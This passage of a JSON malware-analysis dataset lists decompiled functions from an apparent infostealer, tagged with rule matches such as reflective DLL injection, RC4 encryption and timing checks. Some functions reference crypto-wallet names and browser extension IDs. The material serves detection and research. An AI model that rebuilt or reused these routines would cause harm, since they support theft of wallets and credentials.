        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00426bc0(int32_t arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint var_1h;\n    \n    uVar2 = arg_10h;\n    pcVar1 = arg_ch;\n    (*arg_ch)(arg_10h, &var_1h, 1);\n    (*pcVar1)(uVar2, &var_1h, 1);\n    arg_ch = CONCAT13(7, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = CONCAT13(8, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xc) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xd) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xe) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xf) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x10) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x11) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x12) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x13) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x14) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x15) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x16) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x17) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    return 0;\n}\n",
        "token_count": 774
    },
    "00426ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00426ce0(uint8_t *arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = arg_10h;\n    pcVar1 = arg_ch;\n    (*arg_ch)(arg_10h, &var_1h, 1);\n    (*pcVar1)(uVar2, &var_1h, 1);\n    arg_ch = CONCAT13(1, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = CONCAT13(2, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *arg_8h << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[1] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[2] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[3] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[4] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[5] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[6] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[7] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[8] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[9] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[10] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xb] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xc] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xd] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xe] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xf] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x10] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x11] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x12] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x13] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x14] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x15] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x16] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x17] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x18] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x18) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x20] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x20) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x24] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x24) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x28] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x29] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x2a] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x2b] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x30] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x31] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x32] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x33] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x34] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x35] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x36] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x37] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    iVar3 = (*pcVar1)(uVar2, arg_8h + 0x148, *(arg_8h + 0x18));\n    if (iVar3 != *(arg_8h + 0x18)) {\n        return 10;\n    }\n    if ((*(arg_8h + 0x20) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(arg_8h + 0x140), *(arg_8h + 0x20)),  iVar3 != *(arg_8h + 0x20))) {\n        return 10;\n    }\n    if ((*(arg_8h + 0x24) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(arg_8h + 0x144), *(arg_8h + 0x24)),  iVar3 != *(arg_8h + 0x24))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 2348
    },
    "004276c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004276c0(char *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    *(in_ECX + 2) = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    in_ECX[6] = 0;\n    in_ECX[8] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xf] = 0;\n    in_ECX[0x11] = 0;\n    in_ECX[0x12] = 0;\n    in_ECX[0x1f] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        iVar1 = (**0x469150)(arg_8h);\n        uVar2 = fcn.0042b9b1(iVar1 + 1);\n        *in_ECX = uVar2;\n        (**0x469304)(uVar2, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "00427de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00427de0(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    \n    if (*(in_ECX + 0x84) == 0) {\n        if (*(in_ECX + 0x7c) == 0) {\n            *(in_ECX + 0x14) = 0x1000000;\n        }\n        else {\n            iVar3 = (**0x469214)(*(in_ECX + 0x7c), arg_8h, arg_ch, &arg_ch, 0);\n            uVar1 = arg_ch;\n            if (iVar3 != 0) {\n                *(in_ECX + 0x74) = *(in_ECX + 0x74) + arg_ch;\n                uVar2 = fcn.004271d0(*(in_ECX + 0x78), arg_8h, arg_ch);\n                *(in_ECX + 0x78) = uVar2;\n                return uVar1;\n            }\n        }\n    }\n    else {\n        uVar1 = *(in_ECX + 0x8c);\n        if (uVar1 < *(in_ECX + 0x88)) {\n            arg_10h = *(in_ECX + 0x88) - uVar1;\n            if (arg_ch < arg_10h) {\n                arg_10h = arg_ch;\n            }\n            fcn.0042af40(arg_8h, uVar1 + *(in_ECX + 0x84), arg_10h);\n            *(in_ECX + 0x8c) = *(in_ECX + 0x8c) + arg_10h;\n            *(in_ECX + 0x74) = *(in_ECX + 0x74) + arg_10h;\n            uVar2 = fcn.004271d0(*(in_ECX + 0x78), arg_8h, arg_10h);\n            *(in_ECX + 0x78) = uVar2;\n            return arg_10h;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 498
    },
    "004284a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004284a0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    fcn.00426410(arg_8h, arg_ch + -0x101, 5);\n    fcn.00426410(arg_8h, arg_10h + -1, 5);\n    fcn.00426410(arg_8h, arg_14h + -4, 4);\n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            fcn.00426410(arg_8h, *(arg_8h + 0xef6 + *(iVar1 + 0x44828c) * 4), 3);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    fcn.00428260(arg_8h, arg_8h + 0x14, arg_ch + -1);\n    fcn.00428260(arg_8h, arg_8h + 0x908, arg_10h + -1);\n    return;\n}\n",
        "token_count": 267
    },
    "004289a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004289a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f96b;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = fcn.0042b9b1(0x4098);\n    var_4h = 0;\n    if (iVar1 == 0) {\n        piVar2 = NULL;\n    }\n    else {\n        piVar2 = fcn.004276c0(arg_14h);\n    }\n    var_4h = 0xffffffff;\n    *0x46938c = fcn.00427720(arg_8h, arg_ch, arg_10h);\n    if (*0x46938c != 0) {\n        if (piVar2 != NULL) {\n            if (piVar2[0x12] != 0) {\n                fcn.0042ac49(piVar2[0x12]);\n            }\n            piVar2[0x12] = 0;\n            if (piVar2[0xf] != 0) {\n                fcn.0042ac49(piVar2[0xf]);\n            }\n            piVar2[0xf] = 0;\n            if (*piVar2 != 0) {\n                fcn.0042ac49(*piVar2);\n            }\n            *piVar2 = 0;\n            fcn.0042ac49(piVar2);\n        }\n        *in_FS_OFFSET = var_ch;\n        return NULL;\n    }\n    puVar3 = fcn.0042b9b1(8);\n    *puVar3 = 2;\n    puVar3[1] = piVar2;\n    *in_FS_OFFSET = var_ch;\n    return puVar3;\n}\n",
        "token_count": 475
    },
    "00428aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428aa0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004289a0(arg_8h, arg_ch, 3, arg_10h);\n    return;\n}\n",
        "token_count": 56
    },
    "00429510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00429510(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) == 0) {\n        iVar1 = fcn.0042b9b1(0x6afa8);\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            fcn.00425c60();\n            *(iVar1 + 0x6af70) = 0;\n        }\n        *(in_ECX + 0x48) = iVar1;\n    }\n    *(*(in_ECX + 0x48) + 0x6afa4) = 0;\n    *(*(in_ECX + 0x48) + 0xc) = 0x427cb0;\n    *(*(in_ECX + 0x48) + 0x10) = 0x427bc0;\n    **(in_ECX + 0x48) = in_ECX;\n    *(*(in_ECX + 0x48) + 4) = 8;\n    *(*(in_ECX + 0x48) + 8) = *(in_ECX + 0x6c);\n    *(*(in_ECX + 0x48) + 0x6afa4) = 0;\n    *(*(in_ECX + 0x48) + 0xe7e) = 0;\n    *(*(in_ECX + 0x48) + 0x6af70) = 0;\n    iVar1 = *(in_ECX + 0x48);\n    *(iVar1 + 0x1af60) = in_ECX + 0x94;\n    *(iVar1 + 0x1af68) = 0x4000;\n    *(iVar1 + 0x1af64) = 0;\n    *(iVar1 + 0x1af54) = 1;\n    *(iVar1 + 0x1af58) = 0;\n    *(iVar1 + 0x1af5c) = 0;\n    *(iVar1 + 0x1af6c) = 0;\n    fcn.00428ac0(*(in_ECX + 0x48), arg_8h + 0x2a);\n    fcn.00428690(*(in_ECX + 0x48), *(*(in_ECX + 0x48) + 4), arg_8h + 4);\n    uVar2 = fcn.004291a0(*(in_ECX + 0x48));\n    *(in_ECX + 0x90) = uVar2;\n    uVar2 = 0;\n    if (*(*(in_ECX + 0x48) + 0x6afa4) != 0) {\n        uVar2 = 0x5000000;\n    }\n    return uVar2;\n}\n",
        "token_count": 654
    },
    "0042aa6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042aa6c(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    fcn.00430448(arg_8h, *(\"Opera Wallet\" + arg_ch * 4), arg_10h);\n    return;\n}\n",
        "token_count": 64
    },
    "0043197e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043197e(uint arg_8h)\n\n{\n    fcn.0043183e(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00436e56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00436e6a)\n// WARNING: Removing unreachable block (ram,0x00436e70)\n// WARNING: Removing unreachable block (ram,0x00436e72)\n\nvoid fcn.00436e56(void)\n\n{\n    return;\n}\n",
        "token_count": 65
    },
    "0043bfdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043bfdf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00434110(0x44ec68, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.0043064c();\n        *puVar1 = 0x16;\n        fcn.00431ed7();\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0043b8ab(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0043c075();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.00434155();\n    return;\n}\n",
        "token_count": 440
    },
    "0043c0a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c0a3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0043bfdf(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 80
    },
    "004064b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004064b0(uchar *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    if ((*(arg_ch + 0x14) - *(arg_ch + 0x10) < *(arg_10h + 0x10)) &&\n       (*(arg_ch + 0x10) <= *(arg_10h + 0x14) - *(arg_10h + 0x10))) {\n        arg_8h_00 = fcn.00405eb0(0, arg_ch, 0, 0xffffffff);\n    }\n    else {\n        arg_8h_00 = fcn.00405dc0(arg_10h, 0, 0xffffffff);\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063b0(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 250
    },
    "0040bc10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc10(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    iVar2 = in_ECX[4];\n    if (-iVar2 - 1U <= arg_8h) {\n        iVar2 = fcn.0042a14e(0x4453fc);\n    }\n    if (arg_8h != 0) {\n        uVar1 = iVar2 + arg_8h;\n        if (uVar1 == 0xffffffff) {\n            iVar2 = fcn.0042a14e(0x4453fc);\n        }\n        if (in_ECX[5] < uVar1) {\n            fcn.00405b70(uVar1, iVar2);\n            if (uVar1 == 0) {\n                return;\n            }\n        }\n        else if (uVar1 == 0) {\n            in_ECX[4] = 0;\n            if (0xf < in_ECX[5]) {\n                **in_ECX = 0;\n                return;\n            }\n            *in_ECX = 0;\n            return;\n        }\n        fcn.0040b8d0(in_ECX[4], arg_8h, arg_ch);\n        in_ECX[4] = uVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + uVar1) = 0;\n            return;\n        }\n        *(in_ECX + uVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "00419120": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00419120(uint noname_0, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = arg_10h - arg_ch;\n    if (arg_14h < arg_10h - arg_ch) {\n        uVar1 = arg_14h;\n    }\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "0042ed47": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ed47(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0042aeff(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00419020": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419020(int32_t param_1)\n\n{\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x24) = param_1 + 0x1c;\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 0x14) = param_1 + 0xc;\n    *(param_1 + 0x34) = param_1 + 0x2c;\n    *(param_1 + 0xc) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    return;\n}\n",
        "token_count": 241
    },
    "00420ea0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00420ea0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    \n    puVar1 = NULL;\n    if ((((arg_8h != 0) && (arg_ch != 0)) && (puVar1 = (**0x469200)(0x40, arg_ch + 1),  puVar1 != NULL)) &&\n       (arg_ch != 0)) {\n        puVar2 = puVar1;\n        do {\n            *puVar2 = puVar2[arg_8h - puVar1];\n            puVar2 = puVar2 + 1;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 178
    },
    "00427330": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00427330(char *arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    \n    iVar1 = (**0x469150)(arg_8h);\n    for (pcVar2 = arg_8h + iVar1; (arg_8h < pcVar2 && (*pcVar2 != '.')); pcVar2 = pcVar2 + -1) {\n    }\n    if ((pcVar2 == arg_8h) && (*pcVar2 != '.')) {\n        return false;\n    }\n    iVar1 = (**0x469288)(pcVar2, \"jeloidieedojogacfhpaihoh\");\n    if ((((iVar1 != 0) && (iVar1 = (**0x469288)(pcVar2, 0x447114),  iVar1 != 0)) &&\n        (iVar1 = (**0x469288)(pcVar2, \"kkpllkodjeloidieedojogacfhpaihoh\"),  iVar1 != 0)) &&\n       (((iVar1 = (**0x469288)(pcVar2, \" Wallet\"),  iVar1 != 0 &&\n         (iVar1 = (**0x469288)(pcVar2, \"OKX Web3 Wallet\"),  iVar1 != 0)) &&\n        ((iVar1 = (**0x469288)(pcVar2, 0x4487c4),  iVar1 != 0 && (iVar1 = (**0x469288)(pcVar2, 0x4487c0),  iVar1 != 0)))\n        ))) {\n        iVar1 = (**0x469288)(pcVar2, 0x4487b8);\n        return iVar1 == 0;\n    }\n    return true;\n}\n",
        "token_count": 382
    },
    "0042a209": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042a209(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint auStack20 [3];\n    uint uStack8;\n    \n    do {\n        iVar2 = fcn.0042ae6b(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00431c22(param_1);\n    } while (iVar2 != 0);\n    if ((*0x4695ac & 1) == 0) {\n        *0x4695ac = *0x4695ac | 1;\n        uStack8 = 0x448ec4;\n        fcn.0042b2a1(&uStack8);\n        *0x4695a0 = 0x4453c4;\n        fcn.0042db0e(0x43fbe1);\n    }\n    fcn.0042b3ae(0x4695a0);\n    auStack20[0] = 0x4453c4;\n    fcn.0042ba31(auStack20, 0x44c830);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 273
    },
    "0042db40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.0042db40(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "004314bb": {
        "rules": [
            "contain loop"
        ],
